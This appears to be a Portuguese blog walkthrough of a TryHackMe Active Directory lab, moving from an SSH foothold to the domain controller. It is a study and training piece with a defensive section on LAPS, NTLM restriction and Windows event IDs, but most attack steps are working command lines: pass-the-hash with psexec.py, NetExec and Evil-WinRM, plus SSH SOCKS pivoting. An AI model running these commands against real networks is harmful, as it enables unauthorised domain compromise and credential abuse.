---
layout: post
title: "AD Lateral Movement - PsExec, WinRM, Pass-the-Hash e Pivoting"
description: "Walkthrough TryHackMe completo: da WRK ao Domain Controller usando PsExec, Evil-WinRM, NT hashes, túnel SSH e ProxyChains, com explicações, comparação de ferramentas e detecção."
date: 2026-10-21
categories: [walkthrough, pentest, windows, tryhackme]
tags: [active-directory, lateral-movement, psexec, impacket, netexec, smb, winrm, evil-winrm, pass-the-hash, ntlm, ssh, pivoting, proxychains, socks, windows-laps, detection]
---

<a id="topo"></a>

# AD Lateral Movement — PsExec, WinRM, Pass-the-Hash e Pivoting

Em uma rede Active Directory, comprometer uma máquina costuma ser apenas o início. **Movimentação lateral** é passar de um host a outro utilizando credenciais e recursos de administração remota. Nesta room do **TryHackMe**, comecei com acesso SSH a um Linux e avancei até o **Domain Controller (DC)**, combinando privilégios locais, hashes NTLM e um túnel de rede.

O mais importante foi perceber que cada avanço dependia de **duas condições diferentes: permissão no destino e conectividade até ele**.

> Laboratório autorizado. Senhas e hashes indicados como placeholders devem ser substituídos pelos valores obtidos no próprio exercício.

## Índice

- [1. Ambiente e caminho percorrido](#ambiente)
- [2. Reconhecimento da rede](#recon)
- [3. Primeiro acesso: SSH no WebServer](#ssh)
- [4. PsExec: SYSTEM na WRK](#psexec)
- [5. WinRM: acesso limitado ao SERVER1](#winrm)
- [6. Pass-the-Hash: administrador no SERVER1](#pth)
- [7. Pivoting com SSH local (-L): testar RDP do DC](#localforward)
- [8. Pivoting com SOCKS (-D) e ProxyChains](#socks)
- [9. Acessar o DC e obter a última flag](#dc)
- [10. Ferramentas: vantagens e limitações](#ferramentas)
- [11. Mitigações e detecção no Windows](#defesa)
- [12. Checklist e referência de comandos](#checklist)
- [13. Referências e posts relacionados](#links)

---

<a id="ambiente"></a>

## 1. Ambiente e caminho percorrido

| Máquina | IP | Papel no exercício |
|---|---|---|
| **WebServer** | `192.168.13.71` | Linux comprometido, acesso SSH e servidor Gitea; servirá como pivô |
| **WRK / WRK1** | `192.168.13.61` | Estação Windows na qual `jdoe` é administrador local |
| **SERVER1** | `192.168.13.51` | Servidor Windows; `jdoe` tem acesso WinRM, mas não é administrador |
| **ROOTDC / RDC1** | `192.168.13.100` | Controlador do domínio `thm.loc` |

~~~text
AttackBox
   |
   +-- SSH (jdoe) --> WebServer
   |
   +-- PsExec (jdoe) --> WRK / SYSTEM
   |                         |
   |                         +--> NT hash do Administrator LOCAL
   |
   +-- WinRM (jdoe) --> SERVER1 / usuário comum
   |                      |
   +-- PtH (hash local) -> SERVER1 / Administrator
   |                            |
   |                            +--> NT hash do Domain Admin
   |
   +-- SSH via WebServer --> DC / SYSTEM
                            flag5.txt
~~~

A room fornece credenciais para `jdoe`. Primeiro, usei a senha para entrar na WRK, onde esse usuário tem direitos de administrador local. A partir dali, encontrei um **NT hash de administrador local**. A reutilização dessa credencial abriu o SERVER1, que continha outra credencial, desta vez de **administrador do domínio**.

**Atenção aos IPs:** nas primeiras anotações de `/etc/hosts` aparecia `192.168.12.x`; os testes e o diagrama desta instância usam **192.168.13.x**. Ajustei os nomes conforme a rede efetiva:

~~~bash
sudo sh -c "printf '192.168.13.100 thm.loc ROOTDC.THM.LOC\n192.168.13.71 git.thm.loc\n' >> /etc/hosts"
getent hosts thm.loc git.thm.loc
~~~

O `>>` **acrescenta** linhas; não apaga as anteriores. Se já houver entradas antigas para esses nomes, remova-as para não haver resolução conflitante.

[Voltar ao índice](#topo)

---

<a id="recon"></a>

## 2. Reconhecimento da rede

Antes de tentar acesso remoto, conferi quais hosts respondiam:

~~~bash
fping -agq 192.168.13.0/24 2>/dev/null > hosts.txt
cat hosts.txt
~~~

Resultado:

~~~text
192.168.13.1
192.168.13.51
192.168.13.61
192.168.13.71
192.168.13.100
192.168.13.250
~~~

Depois, examinei os serviços Windows mais relevantes:

~~~bash
nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt
~~~

| Parâmetro | Para que serve |
|---|---|
| `-a -g -q` (fping) | Retorna hosts que responderam, gerando alvos da faixa e reduzindo mensagens |
| `2>/dev/null` | Descarta erros |
| `> hosts.txt` | Salva a saída, sobrescrevendo o arquivo |
| `-p` | Define as portas do Nmap |
| `-sV` / `-sC` | Identifica serviços / executa scripts padrão |
| `-iL` | Lê os IPs do arquivo |

**O que encontrei:** SMB (`445`) aberto na WRK e no SERVER1; no DC, os serviços testados apareciam como `filtered` **a partir da AttackBox**. A máquina `.250` apresentou Samba/WORKGROUP e não foi tratada como membro do domínio.

> `open` significa que houve resposta de serviço; `closed` indica rejeição da conexão; `filtered` significa que a filtragem impediu concluir se estava aberta ou fechada. Um `filtered` no DC não prova que a senha ou o hash estejam errados.

[Voltar ao índice](#topo)

---

<a id="ssh"></a>

## 3. Primeiro acesso: SSH no WebServer

~~~bash
ssh jdoe@192.168.13.71
~~~

Já no Linux:

~~~bash
whoami
id
~~~

Recebi `jdoe` (UID 1001). Essa conta não tinha privilégios adicionais relevantes no Linux, mas era **administradora local na WRK**. Os direitos de uma conta devem ser analisados **em cada host**.

[Voltar ao índice](#topo)

---

<a id="psexec"></a>

## 4. PsExec — SYSTEM na WRK

**PsExec** é uma técnica de administração remota. A implementação do **Impacket** usa SMB `445`, faz upload de um executável no compartilhamento administrativo `ADMIN$` e cria um serviço Windows pelo **Service Control Manager (SCM)**.

Primeiro, usei o **NetExec** para conferir se a credencial de `jdoe` realmente tinha administração local:

~~~bash
nxc smb 192.168.13.61 -u jdoe -p '<SENHA_JDOE>' -d thm.loc
~~~

A saída retornou `(Pwn3d!)`. Isso indica que o NetExec reconheceu privilégios administrativos no alvo. Então iniciei a shell:

~~~bash
psexec.py thm.loc/jdoe:'<SENHA_JDOE>'@192.168.13.61
~~~

Pontos que apareceram na saída:

~~~text
[*] Found writable share ADMIN$
[*] Uploading file jvGiIWdo.exe
[*] Opening SVCManager ...
[*] Creating service dLBO ...
[*] Starting service dLBO ...
C:\Windows\system32>
~~~

Na **WRK**, confirmei:

~~~cmd
whoami
whoami /priv
~~~

~~~text
nt authority\system
~~~

**Por que virei SYSTEM?** Não foi o `jdoe` que mudou de identidade. Ele tinha direitos para instalar o serviço remoto, e o serviço foi iniciado como **LocalSystem**. Isso explica também o rastro de detecção: uma instalação de serviço gera o **Event ID 7045 no log System**.

Flag obtida nesta etapa: `THM{ps3x3c_syst3m_sh3ll}`.

### Credencial encontrada na WRK

Com acesso SYSTEM, li:

~~~cmd
type C:\Users\Administrator\Documents\loot.txt
~~~

A linha tinha o formato típico do `secretsdump`:

~~~text
Administrator:500:LM_HASH:NT_HASH_LOCAL:::
~~~

| Campo | Interpretação |
|---|---|
| `Administrator` | Conta local integrada |
| `500` | RID padrão dessa conta |
| `LM_HASH` | Campo LM, frequentemente com o marcador de hash vazio |
| `NT_HASH_LOCAL` | NT hash que será testado na próxima máquina |

**Dica que fica:** uma conta `WRK1\Administrator` é **local**. Não é a mesma coisa que `THM\Administrator`, administrador **do domínio**.

[Voltar ao índice](#topo)

---

<a id="winrm"></a>

## 5. WinRM — entrar no SERVER1 sem ser administrador

Diferente de PsExec, o **WinRM (Windows Remote Management)** pode permitir uma shell remota a integrantes de **Remote Management Users**, mesmo que não sejam administradores locais. O serviço costuma usar `5985/TCP` (HTTP) ou `5986/TCP` (HTTPS).

Com `jdoe`:

~~~bash
evil-winrm -i 192.168.13.51 -u jdoe -p '<SENHA_JDOE>'
~~~

Dentro da sessão:

~~~powershell
whoami
hostname
~~~

~~~text
thm\jdoe
SERVER1
~~~

Essa shell roda **como o usuário autenticado**, não como SYSTEM. Na room, `jdoe` não podia acessar os arquivos do perfil de Administrator.

Flag desta fase: `THM{w1nrm_r3m0t3_sh3ll}`.

[Voltar ao índice](#topo)

---

<a id="pth"></a>

## 6. Pass-the-Hash — administrador no SERVER1

Aqui entra a credencial encontrada na WRK. **Pass-the-Hash (PtH)** usa o **NT hash diretamente no desafio/resposta NTLM**, sem precisar recuperar a senha original.

É importante distinguir:

| Material | Origem típica | Funciona diretamente com PtH? |
|---|---|---|
| **NT hash (32 caracteres hexadecimais)** | SAM, NTDS.dit, LSASS ou arquivo extraído | **Sim**, quando o serviço aceita NTLM e a conta tem acesso |
| **Net-NTLMv2 (challenge/response)** | Autenticação capturada na rede | **Não**; é outro formato |

Na room, o mesmo hash de **Administrator local** servia na WRK e no SERVER1 — exemplo clássico de **senha administrativa reutilizada**.

### Confirmar onde o hash funciona

~~~bash
nxc smb 192.168.13.61 192.168.13.51 \
  -u Administrator -H '<NT_HASH_LOCAL>' --local-auth
~~~

- `-H`: fornece o NT hash; `--local-auth`: tenta autenticar usando as **contas locais** de cada máquina.
- `[+]`: autenticação aceita; `(Pwn3d!)`: acesso administrativo reconhecido.

### Acesso confirmado com Evil-WinRM

Na prática, utilizei o próprio Evil-WinRM com hash:

~~~bash
evil-winrm -i 192.168.13.51 -u Administrator -H '<NT_HASH_LOCAL>'
~~~

O terminal respondeu:

~~~text
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
server1\administrator
~~~

Agora a diferença fica evidente: antes eu era `thm\jdoe`; agora sou **`server1\administrator`**, uma **conta local administrativa**. O comando `whoami` não retorna SYSTEM porque o WinRM não troca automaticamente a identidade por LocalSystem.

No SERVER1:

~~~powershell
type C:\Users\Administrator\Desktop\flag4.txt
~~~

~~~text
THM{p4ss_th3_h4sh_ftw}
~~~

Também li:

~~~powershell
type C:\Users\Administrator\Documents\da_creds.txt
~~~

~~~text
THM\Administrator:500:LM_HASH:NT_HASH_DA:::
~~~

Essa segunda credencial representa o **Administrator do domínio THM**, e seu NT hash é **diferente** do Administrator local. É essa distinção que possibilita entender o avanço até o DC.

> **Comparação rápida:** PsExec com administração local abre uma shell SYSTEM porque cria um serviço; Evil-WinRM com o mesmo hash abre uma sessão com a identidade da conta Administrator. Não confunda **ser administrador** com **estar executando como SYSTEM**.

[Voltar ao índice](#topo)

---

<a id="localforward"></a>

## 7. Pivoting com SSH `-L` — testar o RDP do DC

Eu já tinha a credencial do domínio, mas havia outro obstáculo: **a AttackBox não alcançava diretamente o DC pela porta SMB 445**, nem o Gitea do WebServer pela porta HTTP 80. O SSH `22` do WebServer estava acessível.

**Pivoting** é fazer o tráfego passar por um host intermediário que consegue alcançar o serviço interno.

### 7.1 Caminho do primeiro túnel

![Caminho SSH local: AttackBox 127.0.0.1:13389, WebServer SSH 22, DC 192.168.13.100 RDP 3389](/assets/images/ad-ssh-local-port-forward.svg)

O objetivo desta primeira prova é **verificar que o RDP do DC responde pelo túnel**, não obter a senha do Administrator.

No **terminal 1 da AttackBox**:

~~~bash
ssh -v -o ExitOnForwardFailure=yes \
  -L 13389:192.168.13.100:3389 \
  jdoe@192.168.13.71 -N
~~~

| Opção | Explicação |
|---|---|
| `-v` | Mostra mensagens de depuração do SSH |
| `-o ExitOnForwardFailure=yes` | Encerra se não conseguir estabelecer o encaminhamento pedido, como abrir a porta local |
| `-L 13389:DC:3389` | Escuta em `127.0.0.1:13389` na AttackBox e encaminha ao RDP `3389` do DC pelo WebServer |
| `-N` | Não abre shell remota; mantém apenas o túnel |

**O terminal ficar parado é normal**, pois o SSH precisa continuar ativo. A opção `ExitOnForwardFailure` não prova sozinha que o serviço remoto funciona.

No **terminal 2**, testei o acesso RDP pela porta local:

~~~bash
xfreerdp /v:127.0.0.1:13389 \
  /u:Administrator /p:'NotTheCorrectPassword' /cert:ignore
~~~

A senha está **deliberadamente incorreta**. A resposta foi:

~~~text
STATUS_LOGON_FAILURE [0xC000006D]
ERRCONNECT_LOGON_FAILURE
~~~

O teste **não autentica**, mas mostra que o serviço RDP respondeu e rejeitou a credencial. No terminal do SSH também apareceram mensagens `direct-tcpip` / `listening port 13389`, indicando o encaminhamento da conexão.

**Aprendizado:** um **erro de login** não é um **erro de conectividade**. Neste caso, era justamente a prova de que o túnel até o RDP funcionava.

### 7.2 `-L` ou `-D`?

| Técnica | O que encaminha | Quando usar |
|---|---|---|
| **SSH `-L`** | Uma porta local para um serviço definido | Testar RDP, HTTP ou outra porta específica |
| **SSH `-D`** | Múltiplas conexões TCP via proxy SOCKS | Acessar vários hosts/serviços usando ProxyChains |

Para o restante da room, usei **`-D`**.

[Voltar ao índice](#topo)

---

<a id="socks"></a>

## 8. Pivoting com SOCKS e ProxyChains

### 8.1 Criar o proxy SOCKS via WebServer

Na AttackBox:

~~~bash
ssh -f -D 1080 jdoe@192.168.13.71 -N
~~~

- `-D 1080`: inicia um **proxy SOCKS local** em `127.0.0.1:1080`.
- `-f`: envia o processo SSH para segundo plano após autenticar.
- `-N`: não executa comando no host remoto.

**SOCKS** não é um serviço do DC; é um intermediário local que aceita conexões de ferramentas e as encaminha pelo SSH.

### 8.2 O que é ProxyChains?

**ProxyChains** é um programa Linux que intercepta conexões TCP compatíveis e as faz passar por um ou mais proxies. Assim, posso executar `proxychains nxc`, `proxychains curl` ou `proxychains psexec.py` sem que cada ferramenta precise configurar SOCKS individualmente.

A configuração utilizada pela room fica em `/etc/proxychains.conf`, na seção `[ProxyList]`:

~~~ini
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
#socks4 127.0.0.1 9050
socks4 127.0.0.1 1080
~~~

**Por que aparece "defaults set to tor"?** É **apenas um comentário** no arquivo de exemplo. Muitos sistemas trazem como padrão o proxy SOCKS do **Tor** em `127.0.0.1:9050`. A linha começa com `#`, portanto está **desativada**. Neste laboratório **não usei Tor**: o proxy ativo é o SSH criado em `1080`.

| Elemento | Significado |
|---|---|
| `[ProxyList]` | Lista de proxies usados |
| `#` | Comenta uma linha; ela não é executada |
| `socks4` | Tipo de proxy, compatível com o SSH dinâmico |
| `127.0.0.1` | Proxy está na própria AttackBox |
| `1080` | Porta onde `ssh -D` está escutando |
| `strict_chain` | Quando habilitado, tenta usar os proxies ativos em sequência |
| `proxy_dns` | Quando habilitado e suportado, encaminha resolução de nomes pelo proxy |

### 8.3 Confirmar o túnel: Gitea pelo ProxyChains

Antes, o `curl` direto ao HTTP do WebServer expirava. Com o proxy:

~~~bash
proxychains curl -s http://192.168.13.71 | head -20
~~~

A saída mostrou:

~~~text
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.13.71:80-<><>-OK
<!DOCTYPE html>
<html lang="en-US" data-theme="gitea-auto">
<title>Gitea: Git with a cup of tea</title>
~~~

- `S-chain`: uso da cadeia configurada no ProxyChains.
- `127.0.0.1:1080`: proxy SOCKS local.
- `192.168.13.71:80`: destino HTTP atingido.
- `-OK`: conexão TCP estabelecida.
- `| head -20`: mostra apenas as primeiras 20 linhas do HTML.

**Esse resultado confirma o pivoting:** o Gitea, que não respondia diretamente à AttackBox, passou a responder pelo túnel.

Também é possível abrir o **Firefox** com proxy manual `SOCKS v4` em `127.0.0.1:1080` e navegar para `http://192.168.13.71`.

### 8.4 Nmap através de ProxyChains

~~~bash
proxychains nmap -sT -Pn -p 445,3389,5985 192.168.13.100
~~~

- **`-sT` (TCP Connect)**, no lugar de `-sS`: a conexão precisa passar pelo proxy, não enviar pacotes SYN brutos.
- **`-Pn`**: não depende do ping inicial, que costuma falhar via SOCKS.
- ProxyChains tradicional **não** encaminha ping ICMP nem `nmap -sU` (UDP).

[Voltar ao índice](#topo)

---

<a id="dc"></a>

## 9. Último salto — Domain Controller

Com o proxy funcionando e o **NT hash do Domain Admin** encontrado no SERVER1, consegui atingir o DC via **SMB 445**. Para verificar a credencial:

~~~bash
proxychains nxc smb 192.168.13.100 \
  -u Administrator -H '<NT_HASH_DA>' -d thm.loc
~~~

O acesso final foi feito pelo PsExec **através do mesmo túnel**:

~~~bash
proxychains psexec.py -hashes :<NT_HASH_DA> \
  thm.loc/Administrator@192.168.13.100
~~~

O `:` antes do NT hash indica o **campo LM vazio** no argumento `-hashes LM:NT`; `thm.loc/Administrator` deixa explícito que é a conta do **domínio**, e não a conta local do servidor anterior.

A saída comprovou a conexão:

~~~text
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.13.100:445-<><>-OK
[*] Found writable share ADMIN$
[*] Uploading file AhiJsjRK.exe
[*] Creating service WOQe ...
[*] Starting service WOQe ...
C:\Windows\system32>
~~~

Já dentro do DC:

~~~cmd
whoami
hostname
type C:\Users\Administrator\Desktop\flag5.txt
~~~

Resultado:

~~~text
nt authority\system
RDC1
THM{d0m41n_c0mpr0m1s3d_v1a_p1v0t}
~~~

**Room concluída.** A sequência mostrou dois tipos de obstáculo: primeiro precisei de **privilégios/credenciais**; depois, de um **caminho de rede**. O SSH/ProxyChains resolveu o segundo problema, e o hash do domínio resolveu o primeiro.

[Voltar ao índice](#topo)

---

<a id="ferramentas"></a>

## 10. Ferramentas: vantagens, limitações e quando usar

### Execução remota Windows

| Ferramenta | Vantagem | Limitação / detecção | Quando considerar |
|---|---|---|---|
| **PsExec (Impacket)** | Shell SYSTEM via serviço | Exige admin/SMB; escreve binário e gera `7045` | Administração remota via SMB |
| **Evil-WinRM** | PowerShell interativo; pode aceitar Remote Management Users | Precisa WinRM e direitos de sessão; roda como usuário autenticado | Gerenciamento PowerShell remoto |
| **NetExec** | Verifica várias contas/hosts; sinaliza `(Pwn3d!)` | Múltiplas autenticações chamam atenção | Validar acesso antes de outros passos |
| **wmiexec.py** | Executa comandos por WMI sem instalar serviço como PsExec | Exige permissões remotas e conectividade RPC/DCOM | Operações remotas com WMI |
| **smbexec.py** | Não precisa enviar o mesmo executável de serviço do PsExec | Cria serviço, podendo gerar `7045` | Outro método de execução via SMB |
| **atexec.py** | Usa Agendador de Tarefas | Criação de tarefas deixa evidências, como `4698` | Ambientes onde há permissão de tarefas |
| **RDP** | Área de trabalho gráfica | Requer serviço e autorização de logon RDP; `4624` tipo 10 | Aplicações com interface gráfica |

**Cuidado:** quantidade de eventos não torna uma ferramenta invisível. WMI e WinRM também podem gerar telemetria relevante.

### Ferramentas de pivoting

| Ferramenta | Prós | Contras | Uso típico |
|---|---|---|---|
| **SSH `-L`** | Simples e direto | Cada destino/porta precisa de configuração | Encaminhar um serviço |
| **SSH `-D` + ProxyChains** | Um SOCKS para várias conexões TCP | Limitações de UDP/ICMP, DNS e certos programas | Laboratórios pequenos/médios |
| **Chisel** | Túnel via HTTP; não depende de SSH | Requer cliente/servidor executáveis | Host pivô sem SSH |
| **Ligolo-ng** | Interface TUN; ferramentas usam rotas de rede | Configuração inicial mais elaborada | Múltiplas redes e pivôs |

[Voltar ao índice](#topo)

---

<a id="defesa"></a>

## 11. Mitigações e detecção no Windows

O fluxo da room permite associar cada problema a um controle defensivo.

| Controle | Que parte da cadeia reduz |
|---|---|
| **Windows LAPS** | Mantém senhas locais únicas e rotativas: o hash do Administrator da WRK não serviria automaticamente no SERVER1 |
| **Privilégio mínimo** | Evita conceder administração local a contas de uso comum e reduz execução remota via serviços |
| **Restringir NTLM** | Dificulta Pass-the-Hash; é importante auditar dependências antes de negar |
| **Firewall e segmentação** | Limita SMB 445, WinRM 5985 e RDP 3389 entre máquinas que não precisam se comunicar |
| **PAW / administração por camadas** | Evita que contas de Domain Admin sejam utilizadas em estações e servidores comuns |
| **Credential Guard** | Ajuda a proteger credenciais em memória no LSASS; **não impede a leitura de um arquivo `loot.txt` já exposto** |
| **SMB signing** | Protege integridade SMB e dificulta **SMB relay**; **não bloqueia sozinho PsExec nem PtH com credencial válida** |

**Windows LAPS** (Local Administrator Password Solution) é o recurso da Microsoft que gerencia senhas de administrador local exclusivas por computador. Está disponível em versões suportadas do Windows por atualizações adequadas, inclusive algumas anteriores ao Windows 11. É a resposta à pergunta sobre senhas locais únicas.

### Eventos que eu procuraria no SOC

| Event ID | Log | Indício a investigar |
|---|---|---|
| `4624`, Type 3 | Security | Login de rede por SMB/WinRM de origem incomum |
| `4624`, Type 10 | Security | Login RDP |
| `4648` | Security | Credenciais explícitas, se o mecanismo gerar esse evento |
| **`7045`** | **System** | Serviço recém-instalado, como na execução por PsExec |
| `4698` | Security | Tarefa agendada criada |
| `4688` | Security | Criação de processo (detalhes dependem da auditoria) |
| Sysmon `1` | Sysmon/Operational | Processo criado e processo pai |
| Sysmon `10` | Sysmon/Operational | Acesso a outros processos, relevante em investigação de LSASS |

**Comando direto no PowerShell para o Event ID 7045:**

~~~powershell
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} |
  Select-Object TimeCreated, Id, Message
~~~

`TimeCreated` fica primeiro, como referência temporal para correlacionar o serviço com autenticações e processos. **Serviço novo não é automaticamente ataque**: verificar origem, conta, comando, nome e contexto administrativo.

[Voltar ao índice](#topo)

---

<a id="checklist"></a>

## 12. Checklist de movimentação lateral e comandos

| Etapa | O que perguntar | Comandos / ferramentas |
|---|---|---|
| **1. Recon** | Quais hosts/portas posso alcançar? | `fping`, `nmap` |
| **2. Identidade** | Quem sou e em qual máquina? | `whoami`, `hostname`, `id` |
| **3. Direitos** | Tenho login, admin local ou Domain Admin? | `nxc`, `whoami /priv` |
| **4. Acesso remoto** | O alvo aceita SMB, WinRM, SSH ou RDP? | PsExec, Evil-WinRM, SSH, RDP |
| **5. Credenciais** | Qual hash pertence a qual conta e escopo? | Análise de artefatos autorizados |
| **6. Validação** | A credencial foi aceita? Tenho privilégios? | Saídas `[+]`, `(Pwn3d!)` e `whoami` |
| **7. Pivô** | A origem enxerga o destino? Um intermediário enxerga? | SSH `-L`/`-D`, ProxyChains |
| **8. Prova** | Qual host realmente executou o comando? | `hostname`, `whoami`, artefato solicitado |
| **9. Defesa** | Que evento ficou registrado? | `Get-WinEvent`, Sysmon |

### Operadores mais úteis desta room

| Opção / operador | Explicação |
|---|---|
| `-u` / `-p` | Usuário / senha |
| `-H` (NetExec, Evil-WinRM) | NT hash |
| `--local-auth` | Autenticar no banco local de contas |
| `-hashes LM:NT` | Hashes no formato esperado pelo Impacket |
| `-d` | Domínio no NetExec |
| `-v` | Debug do SSH |
| `-L` / `-D` | Encaminhamento local / proxy dinâmico SSH |
| `-f` / `-N` | Background / sem execução remota |
| `-sT` / `-Pn` | TCP Connect / sem descoberta por ping |
| `-s` (curl) | Silencia mensagens de progresso |
| `|` | Encaminha saída para outro comando |
| `>` / `>>` | Sobrescreve / acrescenta em arquivo |
| `2>/dev/null` | Descarta a saída de erros |

**O que aprendi:** não adianta ter a credencial correta se a porta não é alcançável; e não adianta alcançar a porta sem autorização no destino. A ordem que funcionou foi **reconhecer → validar permissões → acessar → encontrar nova credencial → conferir o caminho de rede → avançar → confirmar identidade e resultado**.

**Flags confirmadas nas anotações da room:** `THM{ps3x3c_syst3m_sh3ll}`, `THM{w1nrm_r3m0t3_sh3ll}`, `THM{p4ss_th3_h4sh_ftw}` e `THM{d0m41n_c0mpr0m1s3d_v1a_p1v0t}`.

[Voltar ao índice](#topo)

---

<a id="links"></a>

## 13. Referências e posts relacionados

**Outros guias do meu site:**

- [Active Directory — enumeração, password spraying e AS-REP Roasting](/notes/ad-authenticated-enumeration/)
- [Windows Jump — do Guest ao SYSTEM](/notes/windows-jump/)
- [Windows Privilege Escalation — tokens, privilégios e Pass-the-Hash](/notes/windows-privilege-escalation/)

**Documentação externa:**

- [TryHackMe](https://tryhackme.com/)
- [Impacket — `psexec.py`](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [NetExec](https://www.netexec.wiki/)
- [ProxyChains-NG](https://github.com/rofl0r/proxychains-ng)
- [OpenSSH — `ssh(1)`](https://man.openbsd.org/ssh)
- [MITRE ATT&CK — Remote Services](https://attack.mitre.org/techniques/T1021/)
- [MITRE ATT&CK — Pass-the-Hash](https://attack.mitre.org/techniques/T1550/002/)
- [Microsoft Learn — Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)

[Voltar ao topo](#topo)
